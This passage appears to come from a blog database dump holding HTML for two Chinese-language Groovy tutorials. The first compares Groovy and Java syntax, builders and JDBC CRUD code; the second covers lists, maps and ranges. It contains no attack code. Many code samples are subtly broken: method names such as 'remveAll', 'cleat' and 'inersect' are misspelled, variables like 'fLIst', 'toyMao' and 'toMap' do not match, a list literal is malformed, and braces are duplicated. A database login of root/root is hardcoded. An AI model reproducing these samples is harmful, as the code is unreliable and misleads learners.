//在Groovy中默认为public的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>正则表达式常量在Java中没有，在Groovy中表示为 /pattern/</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Hash常量(类型为java.util.HashMap)在Java没有，在Groovy中表示为</p>\r\n\r\n<p>def frequence = [&quot;the&quot;: 5, &quot;hello&quot;: 2, &quot;world&quot;: 2]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>类变量即</p>\r\n\r\n<p>static变量，Groovy与Java相同，</p>\r\n\r\n<p>static String name =&ldquo;Swk&rdquo;，</p>\r\n\r\n<p>在</p>\r\n\r\n<p>Groovy也可写为</p>\r\n\r\n<p>static name =&ldquo;Swk&quot;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在varargs方法方面，Groovy比Java多一种表达方式，如下所示：</p>\r\n\r\n<p>Java:</p>\r\n\r\n<p>public</p>\r\n\r\n<p>&nbsp;void varargsMethod(Type &nbsp;args) {</p>\r\n\r\n<p>&nbsp;&nbsp;//do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;&nbsp;//do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>Groovy:</p>\r\n\r\n<p>//</p>\r\n\r\n<p>与Java中的写法相同</p>\r\n\r\n<p>def</p>\r\n\r\n<p>varargsMethod(Type... args) {</p>\r\n\r\n<p>&nbsp;&nbsp;//do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// Groovy</p>\r\n\r\n<p>&nbsp;&nbsp;//do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// Groovy</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>还可以用[]代替...，反应出varargs的本质</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>def &nbsp;varargsMethod(Type[] args) {</p>\r\n\r\n<p>&nbsp;&nbsp;//do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;&nbsp;//do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>引用当前对象，</p>\r\n\r\n<p>Groovy和Java</p>\r\n\r\n<p>相同，在Java中用this表示，在Groovy中也用this表示，而且在Groovy中，this可以出现在static范围中，指向所在类的类对象，本例中，this等同于ThisInStaticScope.class（Java写法）或ThisInStaticScope（Groovy写法）</p>\r\n\r\n<p>class ThisInStaticScope{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>static</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>println this</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>//请不要诡异，参数类型可以省略。如果方法声明中有修饰关键字比如</p>\r\n\r\n<p>public，synchronized，static等，则返回值类型可以省略。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>static main(args) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>println this</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>&nbsp;}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>子类中调用父类方法，</p>\r\n\r\n<p>Groovy和Java也相同，在Java中 super.methodName() ，在Groovy中 super.methodName()</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>命名空间的定义，Groovy和Java相同，在Java中 package edu.ecust.bluesun; &nbsp;&nbsp;在Groovy中package edu.ecust.bluesun （分号可省略）</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在导入类方面，Groovy和Java相同，在Java中 import edu.ecust.bluesun.GroovyTest; 在Groovy中 import edu.ecust.bluesun.GroovyTest</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>List常量(类型为java.util.ArrayList)在Java中没有， 在Groovy中表示为 def list = [3, 11, &ldquo;Hello&rdquo;, &ldquo;Swk&quot;, &quot;!&quot;]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在异常处理方面，Groovy与Java相同，除了不强制程序员捕获检查异常(checked exception)外 (这跟C#很像，如果我没记错的话 :)&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>并且在方法声明时，也可以不写throws语句。&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>方法的默认参数，Java中没有，Groovy中表示如下：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>class Hello {</p>\r\n\r\n<p>&nbsp;&nbsp;</p>\r\n\r\n<p>//如果没有参数传入，默认打印出 Hello, 满座</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;def greet(name=&ldquo;Swk&quot;) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;println(&quot;Hello, $name&quot;) //也可省略括号()</p>\r\n\r\n<p>&nbsp;&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在Groovy中，语句如果单独占一行的话，句尾的分号(;)可以省略，而在Java中每条语句后面必须跟有分号(;)</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在Groovy中，如果不是Boolean或boolean类型，非null或非空(空字符串，[]，[:])为true，null为false，而Java中对象不可以表示true或false；如果是Boolean或boolean类型，与Java中的一样。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在Groovy中，万事万物都是对象！而Java中不是这样，基本类型(primitive type)就不是对象。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在Java中，Class对象表示为ClassName.class，而在Groovy中，可以直接用ClassName表示Class对象</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Groovy 会自动导入java.lang.*, java.util.*, java.net.*, java.io.*, java.math.BigInteger,java.math.BigDecimal, &nbsp;&nbsp;groovy.lang.*, groovy.util.*，而Java则只自动导入java.lang.*&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Groovy不仅有? :三元操作符，还有?:两元操作符，但Java只有? :三元操作符。</p>\r\n\r\n<p>Groovy:</p>\r\n\r\n<p>def a = null;</p>\r\n\r\n<p>// 如果a为&ldquo;空&rdquo;（null，空串&ldquo;&rdquo;，[]，[:]），那么结果为?:之后的那个值; 如果不为&ldquo;空&rdquo;，那么结果就是a</p>\r\n\r\n<p>def result = a ?: &ldquo;default result&rdquo;</p>\r\n\r\n<p>println result</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>a = &ldquo;满座&quot;</p>\r\n\r\n<p>result = a ?: &quot;default result&quot;</p>\r\n\r\n<p>println result</p>\r\n\r\n<p>Groovy能进行多重赋值，但Java不能</p>\r\n\r\n<p>Groovy:</p>\r\n\r\n<p>def a, b</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(a, b) = [1, 2] &nbsp;// 给a和b赋值</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>println([a, b])</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(a, b) = [b, a] &nbsp;// 交换a和b的值</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>println([a, b])</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>def (c, d) = [1, 2] // 声明的同时进行初始化</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>println([c, d])</p>\r\n\r\n<p>Builder是Groovy相当有用的一个特性，样例常常用生成XML来展现Builder所带来的便利性，例如以下代码:</p>\r\n\r\n<p>def createXML(){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;def xml = new MarkupBuilder();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;xml.cars(number:2){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;description &nbsp;&#39;汽车大卖场&#39;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;city &#39;北京&#39;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;img &#39;http://www.manzuo.com/beijing.jpg&#39;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;car1(name:&#39;卡尔&middot;奔茨&#39;,ISBN:&#39;1-2010-11-02&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;car2(name:&#39;兰博基尼&#39;,ISBN:&#39;1-2012-11-02&#39;)&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;xml.println();</p>\r\n\r\n<p>&nbsp;&nbsp;}</p>\r\n\r\n<p>结果：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&lt;cars number=&#39;2&#39;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&lt;description&gt;汽车大卖场&lt;/description&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&lt;city&gt;北京&lt;/city&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&lt;img&gt;http://www.manzuo.com/beijing.jpg&lt;/img&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&lt;car1 name=&#39;卡尔&middot;奔茨&#39; ISBN=&#39;1-2010-11-02&#39; /&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&lt;car2 name=&#39;兰博基尼&#39; ISBN=&#39;1-2012-11-02&#39; /&gt;</p>\r\n\r\n<p>&lt;/cars&gt;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>从例子可以看到,在Groovy中创建xml非常便利</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Groovy Builder 创建HTML，代码示例:</p>\r\n\r\n<p>def createHTML(){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;def html = &nbsp;new MarkupBuilder();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;html.html(){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;title &#39;Hello Word&#39;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;body{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;table{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tr{td &#39;姓名&rsquo; &nbsp;td &#39;Sunweikun&#39;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tr{td &#39;性别&lsquo; td &#39;男&#39;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tr{td &#39;爱好&lsquo; td &#39;打桌球、篮球、足球、KTV&#39;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DIV(id:&#39;myDIV&#39;,class:2){h1 &#39;太好玩啦&#39;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;html.println()</p>\r\n\r\n<p>&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp;结果:&nbsp;</p>\r\n\r\n<p>&lt;html&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&lt;head&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;Hello Word&lt;/title&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&lt;/head&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&lt;body&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&lt;table&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;姓名&lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;Sunweikun&lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;性别&lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;男&lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;爱好&lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;打桌球、篮球、足球、KTV&lt;/td&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/tr&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&lt;/table&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIV id=&#39;myDIV&#39; class=&#39;2&#39;&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;h1&gt;太好玩啦&lt;/h1&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&lt;/DIV&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&lt;/body&gt;</p>\r\n\r\n<p>&lt;/html&gt;</p>\r\n\r\n<p>从以上代码看来，创建html的形式与创建xml非常相似。以节点方式创建，提高了同样功能java代码的效率</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Groovy</p>\r\n\r\n<p>操作数据，效率特别高，代码简洁。同样我们与java的JDBC相比如下</p>\r\n\r\n<p>Java</p>\r\n\r\n<p>代码:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>/**</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>获得连接</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>@return 连接对象</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>@throws ClassNotFoundException&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;* &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class</p>\r\n\r\n<p>异常</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>@throws SQLException&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;* &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQL</p>\r\n\r\n<p>异常</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>/</p>\r\n\r\n<p>&nbsp;&nbsp;public Connection</p>\r\n\r\n<p>getConn() throws ClassNotFoundException, SQLException{</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Env env = new Env();</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Class.forName(env.getProperty(&quot;DRIVER&quot;)); // 注册驱动</p>\r\n\r\n<p>&nbsp;&nbsp;//</p>\r\n\r\n<p>获得连接并返回</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>return DriverManager.getConnection(env.getProperty(&quot;URL&quot;),env.getProperty(&quot;DBNAME&quot;),env.getProperty(&quot;DBPASSWORD&quot;));</p>\r\n\r\n<p>&nbsp;&nbsp;}</p>\r\n\r\n<p>Groovy</p>\r\n\r\n<p>代码:</p>\r\n\r\n<p>&nbsp;/**</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>数据库连接</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>/</p>\r\n\r\n<p>def static</p>\r\n\r\n<p>connectionOpen(){ &nbsp;&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Sql.newInstance(&quot;jdbc:mysql://localhost/manzuo?useUnicode=true&amp;amp;characterEncoding=UTF-8&quot;,&quot;root&quot;,&quot;root&quot;,&quot;org.gjt.mm.mysql.Driver&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;}</p>\r\n\r\n<p>以上比较。</p>\r\n\r\n<p>Java需要声明相关对象与返回值、异常处理,而Groovy不需要声明对象也不需要异常处理及返回类型。</p>\r\n\r\n<p>相比之下</p>\r\n\r\n<p>Groovy是最好的选择</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Groovy的CRUD等操作</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/**</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>查询</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>/</p>\r\n\r\n<p>&nbsp;&nbsp;def findAll(){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>this.connectionOpen().eachRow(&quot;select * from on_comptuan&quot;){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>println &quot;${it.id} --&gt;&quot;+&quot;${it.activityName}--&gt;&quot;+&quot;${it.region}&quot;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/**</p>\r\n\r\n<p>&nbsp;&nbsp;*</p>\r\n\r\n<p>增加</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>/</p>\r\n\r\n<p>&nbsp;&nbsp;def add(){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>this.connectionOpen().execute(&quot;insert into on_comptuan(tname) values(&#39;hello Groovy&#39;)&quot;)</p>\r\n\r\n<p>&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/**</p>\r\n\r\n<p>&nbsp;&nbsp;*</p>\r\n\r\n<p>删除</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>/</p>\r\n\r\n<p>&nbsp;&nbsp;def delete(){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>this.connectionOpen().execute(&quot;delete from on_comptuan where id= ?&quot;,[66])</p>\r\n\r\n<p>&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/**</p>\r\n\r\n<p>&nbsp;&nbsp;*</p>\r\n\r\n<p>更新</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;*</p>\r\n\r\n<p>/</p>\r\n\r\n<p>&nbsp;&nbsp;def update(){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>this.connectionOpen().execute(&quot;update on_comptuan set tname=? where id=?&quot;,[&quot;hahahhah&quot;,64])</p>\r\n\r\n<p>&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>总结：</p>\r\n\r\n<p>看过以上之后我们会知道Groovy几乎完全兼容Java语法，还有人说Groovy是Java的孩子，Groovy不仅继承了java大部分的特性，而且还继承了很多种动态语言，比如Python，Ruby可能还会有其他语言，使Groovy变为高效率的编程语言。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n',0,0,'简单介绍Groovy语法 并与Java比较快速入门',201,'/upload/article/6/2b7d2380-6454-4677-8bf0-e8f3711e407c.jpg',98),(7,0,'20150605200801',1,'<p>1、集合应用很广泛</p>\r\n\r\n<p>2、Groovy直接在语言内使用集合</p>\r\n\r\n<ul>\r\n	<li>不需要导入专门的类，也不需要初始化对象</li>\r\n	<li>集合石语言本身的本地成员</li>\r\n</ul>\r\n\r\n<p>3、每个Groovy集合都是java.util.Colleciton或java.util.Map的实例</p>\r\n\r\n<p>4、List,String,StringBuffer,Range,Map,File,Matcher都是用同一的size()方法获取长度.</p>\r\n\r\n<p>如：StringBUffer x = new StringBuffer(&#39;ssss&#39;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print x.size() //输出4</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><span style=\"font-size:medium\"><strong>列表List一</strong></span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">def toys =[[\'a\',\'001\'] , [2,\'002\'] , [\'c\', \'003\']]\r\n\r\nprintln toys.class           //输出class java.util.ArrayList\r\nassert toys instanceof Collection\r\nprint toys[1]                   //输出[2,\'002\']\r\nprint toys.get(1)             //同上\r\nprint toys[-2]                  //同上\r\nprint toys[1..&lt;2]             //同上\r\ntoys[2] = [3,\'003\']          //修改第3个元素\r\nprint toys[-1]                  //输出： [3,\'003\']\r\ntoys.putAt(2,[33,\'333\'])\r\nprint toys[-1]                  //输出[33,\'333\']</code></pre>\r\n\r\n<p><span style=\"font-size:medium\"><strong>列表List二</strong></span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">1、toys&lt;&lt;[4,\'004\'] //追加元素\r\n\r\n     println toys[-1] //输出:[4,\'004\']\r\n\r\n2、toys1 = [1,2,3] //连接链表\r\n\r\n     toys2 = toys1 + [4,5]\r\n\r\n     println toys2  // 输出:[1,2,3,4,5]\r\n\r\n3、toys3 = toys2 - [5]//列表中删除元素\r\n\r\n     println toys3 //输出：[1,2,3,4]</code></pre>\r\n\r\n<p><span style=\"font-size:medium\"><strong>列表List三</strong></span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>def toy6 =[]</p>\r\n\r\n<ul>\r\n	<li>toy6&lt;&lt;&#39;11&#39;</li>\r\n	<li>toy6&lt;&lt;&#39;22&#39;</li>\r\n	<li>toy6&lt;&lt;&#39;33&#39;</li>\r\n	<li>toy6&lt;&lt;&#39;44&#39;</li>\r\n	<li>println toy6 //输出[&#39;11&#39;,&#39;22&#39;,&#39;33&#39;,&#39;44&#39;]</li>\r\n	<li>toy6&lt;&lt;[8,&#39;008&#39;]</li>\r\n	<li>println toy6&nbsp;//输出[&#39;11&#39;,&#39;22&#39;,&#39;33&#39;,&#39;44&#39;,[8,&#39;008&#39;]]&nbsp; 列表中元素无需一样类型&nbsp;&nbsp;&nbsp;&nbsp;</li>\r\n</ul>\r\n\r\n<p><span style=\"font-size:medium\"><strong>列表List的方法一</strong></span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">1、def list=[1,2,3,4]\r\n\r\nlist.add(5)                          //[1,2,3,4,5]\r\nlist.add(2,11)                     //[1,2,11,3,4,5]\r\nlist.addAll([6,7])                 //[1,2,11,3,4,5,6,7]\r\nprintln list.contains(11)      //true\r\nprintln list.containsAll([11,4])//true\r\nprintln list.indexOf(11)       //2\r\nlist.remove(2);println list    //[1,2,3,4,5,6,7]\r\nlist.remveAll([5,6,7])\r\nprintln list                           //[1,2,3,4]\r\nlist.cleat();println list           //[]</code></pre>\r\n\r\n<p><span style=\"font-size:medium\"><strong>列表List的方法二</strong></span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>1、有些方法会修改原列表，有些方法不修改原列表而只是产生新的列表。</p>\r\n\r\n<p>&nbsp; &nbsp; &nbsp;</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">def fList =[1,2,3[4,5]]\r\n\r\nprintln fList.flatten()                  //[1,2,3,4,5]展开后返回新列表\r\nprintln fList.inersect([3,4,5])     //[3]，求交集，返回新列表\r\nprintln fList.pop()                      //[4,5] 删除列表最后元素\r\nprintln fList.reverse()                //[3,2,1]，反转列表返回新列表\r\nprintln fLIst.sort()                      //[1,2,3]</code></pre>\r\n\r\n<p>2、计算元素</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">def gList = [1,1,2,3,4,3]\r\nprintln gList.count(3)                      //输出：2   有两个3\r\n</code></pre>\r\n\r\n<p><span style=\"font-size:medium\"><strong>映射Map一</strong></span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">1、def bookMap = [:] //定义空map\r\n     println bookMap.getClass() // 输出class java.util.LinkedHashMap\r\n     assert bookMap.size() == 0\r\n2、def toyMap = [1:\'toy1\',2:\'toy2\']\r\n     assert toyMap.containsValue(\'toy1\')\r\n     assert toyMap.containsKey(1)\r\n</code></pre>\r\n\r\n<p><span style=\"font-size:medium\"><strong>映射Map二</strong></span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">1、println toyMap                        //输出整个map, [1:\'toy1\',2:\'toy2\']\r\n\r\n     println toyMap[2]                   // toy2\r\n\r\n     println toyMap.get(1)             // toy1\r\n\r\n\r\n2、toyMap.each{toy -&gt; println toy.key + \':\' + toy.value} // 1:toy1 2:toy2(换行输出) ，toy是指定的闭包参数\r\n\r\n     toyMao.each{println it.key + \':\' + it.value}                 //输出同上，it是默认闭包参数\r\n\r\n\r\n</code></pre>\r\n\r\n<p><span style=\"font-size:medium\"><strong>映射MAP三</strong></span></p>\r\n\r\n<pre>\r\n<code class=\"language-java\">toyMap.put(3,\'toy3\')                        //往map中加入元素\r\nprintln toyMap                                 //[1:\'toy1\',2:\'toy2\',3:\'toy3\']\r\ntopMap.put(3,\'toy333\')                    //键已存在，put就变成了修改值\r\nprintln toyMap                                 //[1:\'toy1\',2:\'toy2\',3:\'toy333\']\r\ntoyMap.remove(3)                           //删除map中的元素，参数是键\r\nprintln toyMap.size()                        //获取Map大小 2\r\nprintln toMap.keySet()                      //获取Map中的key，输出[1,2]\r\nprintln toMap.values()                      //输出：[\'toy1\',\'toy2\']\r\nprintln toMap.values().asList()          //转换为ArrayList\r\nprintln toMap.values().asList().class //class java.util.ArrayList</code></pre>\r\n\r\n<p><strong><span style=\"font-size:medium\">范围一</span></strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>1、def aRange&nbsp;= 1..&lt;5</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; println aRange&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //输出[1,2,3,4]</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; println aRange.class&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//class groovy.lange.IntRange</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; assert aRange instanceof List</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n\r\n<p>(1..&lt;5)范围是IntRange的对象，是特殊的List</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><span style=\"font-size:medium\"><strong>范围二</strong></span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>1、def bRange = &#39;a&#39;..&lt;&#39;e&#39;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; println 